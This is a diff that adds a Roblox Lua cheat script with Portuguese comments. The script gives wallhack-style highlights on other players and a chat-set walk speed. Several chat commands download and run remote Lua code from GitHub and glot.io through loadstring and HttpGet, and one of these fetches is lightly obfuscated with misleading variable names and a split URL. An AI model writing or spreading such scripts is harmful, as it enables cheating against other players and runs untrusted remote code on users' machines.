@@ -1,0 +1,85 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local ESPEnabled = false
+local scriptActivated = false
+local speed = 16 -- Valor padrão de velocidade
+
+-- Função para criar ESP
+function CreateESP(player, color)
+    local highlight = Instance.new("Highlight")
+    highlight.Adornee = player.Character
+    highlight.FillColor = color
+    highlight.OutlineColor = color
+    highlight.Parent = player.Character
+    return highlight
+end
+
+-- Função para alternar ESP
+function ToggleESP(state)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            if state then
+                if not player.Character:FindFirstChildOfClass("Highlight") then
+                    local color = player.TeamColor.Color
+                    CreateESP(player, color)
+                end
+            else
+                if player.Character:FindFirstChildOfClass("Highlight") then
+                    player.Character:FindFirstChildOfClass("Highlight"):Destroy()
+                end
+            end
+        end
+    end
+end
+
+-- Evento quando um novo jogador é adicionado
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        if scriptActivated then
+            local newSpeed = tonumber(message)
+            if newSpeed then
+                speed = newSpeed
+                local localPlayer = Players.LocalPlayer
+                if localPlayer and localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid") then
+                    localPlayer.Character.Humanoid.WalkSpeed = speed
+                end
+            end
+        end
+    end)
+end)
+
+-- Evento quando o jogador local escreve no chat
+Players.LocalPlayer.Chatted:Connect(function(message)
+    if message == "ADM-EXECUTE" then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/latest.lua'))()
+    elseif message == "AIMEXCUTE" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jonthedruger/LatvixDoc/script/idkgamenameforgot.lua", true))()
+    elseif message == "EXECUTE-1" then
+        local z_x, z_z = "gzrux646yj/raw/main.ts", "https://glot.io/snippets/"
+        local im, lonely, z_c = task.wait, game, loadstring
+        z_c(lonely:HttpGet(z_z .. "" .. z_x))()
+    elseif message == "OP-EXECUTE" then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
+    else
+        if scriptActivated then
+            local newSpeed = tonumber(message)
+            if newSpeed then
+                speed = newSpeed
+                local player = Players.LocalPlayer
+                if player and player.Character and player.Character:FindFirstChildOfClass("Humanoid") then
+                    player.Character.Humanoid.WalkSpeed = speed
+                end
+            end
+        end
+    end
+end)
+
+-- Evento de entrada de tecla
+UserInputService.InputBegan:Connect(function(input, isProcessed)
+    if isProcessed then return end
+    if input.KeyCode == Enum.KeyCode.E then
+        scriptActivated = not scriptActivated
+        ESPEnabled = not ESPEnabled
+        ToggleESP(ESPEnabled)
+    end
+end)
